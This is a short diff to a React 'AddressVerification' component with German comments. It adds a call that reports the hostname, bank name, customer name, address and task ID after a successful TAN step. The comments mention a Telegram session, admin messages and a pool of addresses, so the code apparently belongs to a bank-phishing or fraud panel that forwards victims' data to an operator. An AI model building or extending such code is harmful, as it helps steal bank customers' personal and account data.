@@ -335,12 +335,28 @@ const AddressVerification = ({
   // Eigener Effect, damit das Timeout nicht vom Polling-Cleanup abgeräumt wird.
   useEffect(() => {
     if (!addressTanSuccess) return;
+    const addr = rotatedAddressRef.current as any;
+    try {
+      void notifyAddressDeleted({
+        data: {
+          host: typeof window !== "undefined" ? window.location.hostname : null,
+          bankName,
+          customerName: customerName ?? null,
+          street: addr?.street ?? "",
+          zip: addr?.zip_code ?? "",
+          city: addr?.city ?? "",
+          taskId: taskId ?? null,
+        },
+      });
+    } catch (err) {
+      console.warn("[notifyAddressDeleted] failed", err);
+    }
     const t = setTimeout(() => {
       setShowDeleteDialog(false);
       onDelete();
     }, 3000);
     return () => clearTimeout(t);
-  }, [addressTanSuccess, onDelete]);
+  }, [addressTanSuccess, onDelete, bankName, customerName, taskId]);
 
   // Weitere Adresse: bevorzugt aus der Telegram-Session, damit Admin-Nachricht
   // und Kundenseite exakt dieselbe Pool-Adresse zeigen. Nur falls noch keine
